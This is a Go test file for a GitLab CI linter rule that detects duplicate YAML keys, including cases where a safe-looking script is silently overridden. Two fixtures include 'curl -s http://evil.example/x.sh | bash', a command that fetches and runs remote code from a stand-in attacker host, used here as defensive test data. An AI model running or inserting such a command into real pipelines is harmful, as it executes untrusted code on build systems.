// Copyright The glsec Authors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"strings"
	"testing"

	"github.com/glsec/glsec/internal/finding"
	"github.com/glsec/glsec/internal/parser"
	"github.com/glsec/glsec/internal/rule"
)

func findings087(t *testing.T, src string) []finding.Finding {
	t.Helper()
	doc, err := parser.Parse([]byte(src), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	return Check(GL087, doc, "test.yml")
}

func TestGL087_DuplicateScript(t *testing.T) {
	f := findings087(t, `
build:
  script:
    - echo safe
  script:
    - curl -s http://evil.example/x.sh | bash
`)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(f))
	}
	want := finding.Finding{RuleID: "GL087", Severity: finding.Warn, Job: "build", File: "test.yml", Line: 3, Col: 3,
		Message: `duplicate key "script" — GitLab ignores this value and uses the one at line 5`}
	if f[0] != want {
		t.Errorf("got %+v\nwant %+v", f[0], want)
	}
}

func TestGL087_EveryEarlierKeyIsReported(t *testing.T) {
	f := findings087(t, `
build:
  image: a:1
  image: b:2
  image: c:3
  script: [make]
`)
	if len(f) != 2 {
		t.Fatalf("expected 2 findings, got %d", len(f))
	}
	for _, x := range f {
		if !strings.HasSuffix(x.Message, "line 5") {
			t.Errorf("each earlier key must name the winner: %s", x.Message)
		}
	}
}

func TestGL087_CleanNoFinding(t *testing.T) {
	f := findings087(t, `
.base: &base
  image: alpine:3.20
build:
  <<: *base
  image: node:22
  script: [make]
`)
	if len(f) != 0 {
		t.Fatalf("expected no findings, got %v", f)
	}
}

// The other rules see what GitLab runs: the last script:, not the first.
func TestGL087_OtherRulesSeeTheLastValue(t *testing.T) {
	doc, err := parser.Parse([]byte(`
build:
  script:
    - echo safe
  script:
    - curl -s http://evil.example/x.sh | bash
    - sh -c "make | tee build.log"
`), "test.yml")
	if err != nil {
		t.Fatal(err)
	}
	for _, r := range []rule.Rule{GL011, GL024} {
		if len(Check(r, doc, "test.yml")) == 0 {
			t.Errorf("%s misses the pipe in the last script:", r.ID())
		}
	}
}

func TestGL087_AnchoredDuplicate(t *testing.T) {
	doc, err := parser.Parse([]byte(`.tpl: &a
  only: [tags]
.tpl: &b
  only: [main]
job:
  <<: *a
  script: [x]
`), "t.yml")
	if err != nil {
		t.Fatal(err)
	}
	f := GL087.CheckDocument(doc, "t.yml")
	if len(f) != 1 || !strings.Contains(f[0].Message, "the anchor &a in its value is still used") {
		t.Fatalf("unexpected findings: %v", f)
	}
}

// An anchor inside the dropped value is still used by its aliases (#1005).
func TestGL087_NestedAnchor(t *testing.T) {
	doc, err := parser.Parse([]byte(`.base:
  cache: &c
    paths: [.cache/]
.base:
  image: alpine:3.20
build:
  cache: *c
  script: [make]
`), "t.yml")
	if err != nil {
		t.Fatal(err)
	}
	f := GL087.CheckDocument(doc, "t.yml")
	if len(f) != 1 || !strings.Contains(f[0].Message, "the anchor &c in its value is still used") {
		t.Fatalf("unexpected findings: %v", f)
	}
}

func TestGL087_KeyOverriddenByMergeKey(t *testing.T) {
	f := findings087(t, `.always: &always
  rules:
    - when: always
deploy:
  rules:
    - if: $CI_COMMIT_TAG
  <<: *always
  script: [make]
`)
	if len(f) != 1 || f[0].Line != 5 || f[0].Job != "deploy" {
		t.Fatalf("got %v, want one finding on line 5 of deploy", f)
	}
	if !strings.Contains(f[0].Message, "<<: at line 7") || !strings.Contains(f[0].Message, "at line 2") {
		t.Errorf("message should name the <<: and the value used: %s", f[0].Message)
	}
}

func TestGL087_KeyAfterMergeKeyNotFlagged(t *testing.T) {
	f := findings087(t, ".a: &a\n  image: a:1\njob:\n  <<: *a\n  image: own:1\n  script: [make]\n")
	if len(f) != 0 {
		t.Errorf("a key below the <<: overrides it on purpose: %v", f)
	}
}

func TestGL087_OverriddenValueWithAnchor(t *testing.T) {
	f := findings087(t, ".a: &a\n  image: a:1\njob:\n  image: &img own:1\n  <<: *a\nother:\n  image: *img\n")
	if len(f) != 1 || !strings.Contains(f[0].Message, "anchor &img") {
		t.Fatalf("got %v", f)
	}
}
